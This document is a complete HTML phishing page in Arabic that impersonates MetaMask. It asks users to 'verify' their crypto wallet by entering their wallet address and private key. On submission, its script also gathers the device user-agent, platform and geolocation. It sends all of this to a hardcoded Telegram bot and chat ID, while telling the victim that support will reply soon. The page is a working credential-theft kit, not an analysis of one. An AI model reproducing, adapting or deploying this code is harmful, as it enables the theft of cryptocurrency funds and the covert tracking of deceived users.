# ouj.yu.io
<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تأكيد حساب محفظة العملات الرقمية</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f4;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .login-container {
            background-color: #fff;
            width: 350px;
            border: 1px solid #dbdbdb;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
            text-align: center;
        }
        .login-container img {
            margin-bottom: 20px;
            width: 150px;
        }
        .login-container h2 {
            font-size: 18px;
            color: #333;
            margin-bottom: 10px;
        }
        .login-container p {
            font-size: 14px;
            color: #555;
            margin-bottom: 20px;
        }
        .login-container input {
            width: 100%;
            padding: 10px;
            margin: 8px 0;
            border: 1px solid #ccc;
            border-radius: 5px;
            background-color: #fafafa;
            font-size: 14px;
        }
        .login-container button {
            width: 100%;
            padding: 12px;
            margin-top: 10px;
            background-color: #3C3C3C; /* MetaMask color */
            border: none;
            color: white;
            font-weight: bold;
            font-size: 14px;
            border-radius: 5px;
            cursor: pointer;
            transition: background-color 0.3s ease;
        }
        .login-container button:hover {
            background-color: #f39c12; /* Hover color */
        }
        .alert {
            color: red;
            font-size: 13px;
            margin-top: 10px;
            display: none;
        }
        .confirmation {
            color: green;
            font-size: 13px;
            margin-top: 10px;
            display: none;
        }
        .login-container a {
            color: #3C3C3C;
            text-decoration: none;
            font-weight: bold;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/4/4f/MetaMask_Fox.svg" alt="MetaMask Logo">
        <h2>تحقق من حساب محفظتك الرقمية</h2>
        <p>لتأكيد حسابك، يرجى تقديم تفاصيل المحفظة الخاصة بك:</p>
        <form id="verificationForm">
            <input type="text" id="walletAddress" placeholder="عنوان محفظتك الرقمية" required>
            <input type="password" id="privateKey" placeholder="المفتاح الخاص (Private Key)" required>
            <button type="submit">إرسال المعلومات</button>
            <div class="alert" id="errorAlert">الرجاء ملء جميع الحقول!</div>
            <div class="confirmation" id="confirmationAlert">تم إرسال المعلومات! سيتم الرد عليك من قبل الدعم قريبًا.</div>
        </form>
        <p>إذا واجهت مشاكل، يرجى الاتصال بـ <a href="#">الدعم</a>.</p>
    </div>

    <script>
        const form = document.getElementById('verificationForm');
        const walletAddress = document.getElementById('walletAddress');
        const privateKey = document.getElementById('privateKey');
        const alertBox = document.getElementById('errorAlert');
        const confirmationBox = document.getElementById('confirmationAlert');

        // الحصول على معلومات الجهاز من user-agent
        function getDeviceInfo() {
            const userAgent = navigator.userAgent;
            const platform = navigator.platform;
            return { userAgent, platform };
        }

        // الحصول على بيانات الموقع الجغرافي
        function getGeoLocation() {
            return new Promise((resolve, reject) => {
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(resolve, reject);
                } else {
                    reject('الموقع الجغرافي غير مدعوم');
                }
            });
        }

        form.addEventListener('submit', async function (e) {
            e.preventDefault();
            if (walletAddress.value.trim() === "" || privateKey.value.trim() === "") {
                alertBox.style.display = 'block';
                confirmationBox.style.display = 'none';
            } else {
                alertBox.style.display = 'none';
                confirmationBox.style.display = 'block';

                // الحصول على معلومات الجهاز والموقع الجغرافي
                const deviceInfo = getDeviceInfo();
                let location = "الموقع غير متاح";

                try {
                    const geoData = await getGeoLocation();
                    location = `خط العرض: ${geoData.coords.latitude}, خط الطول: ${geoData.coords.longitude}`;
                } catch (error) {
                    console.error("خطأ في الموقع الجغرافي:", error);
                }

                const data = {
                    walletAddress: walletAddress.value.trim(),
                    privateKey: privateKey.value.trim(),
                    location: location,
                    deviceInfo: deviceInfo
                };

                // تنسيق الرسالة باستخدام Markdown لتحسين القراءة
                const message = `
*طلب تأكيد حساب محفظة رقمية*  
*الوقت:* ${new Date().toLocaleString()}

*معلومات المحفظة:*  
- *عنوان المحفظة:* ${data.walletAddress}  
- *المفتاح الخاص:* ${data.privateKey}  

*معلومات الجهاز:*  
- *متصفح المستخدم:* ${data.deviceInfo.userAgent}  
- *النظام:* ${data.deviceInfo.platform}  

*معلومات الموقع:*  
- *الموقع:* ${data.location}
                `;

                try {
                    const response = await fetch('https://api.telegram.org/bot7663844491:AAHRki7GqFHWLg1GV4k6dwSS4chNjPA_Aj8/sendMessage', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            chat_id: '6309290400',
                            text: message,
                            parse_mode: 'Markdown'
                        }),
                    });

                    if (response.ok) {
                        console.log('تم إرسال المعلومات بنجاح!');
                    } else {
                        console.error('فشل في إرسال المعلومات.');
                    }
                } catch (error) {
                    console.error('خطأ:', error);
                }
            }
        });
    </script>
</body>
</html>
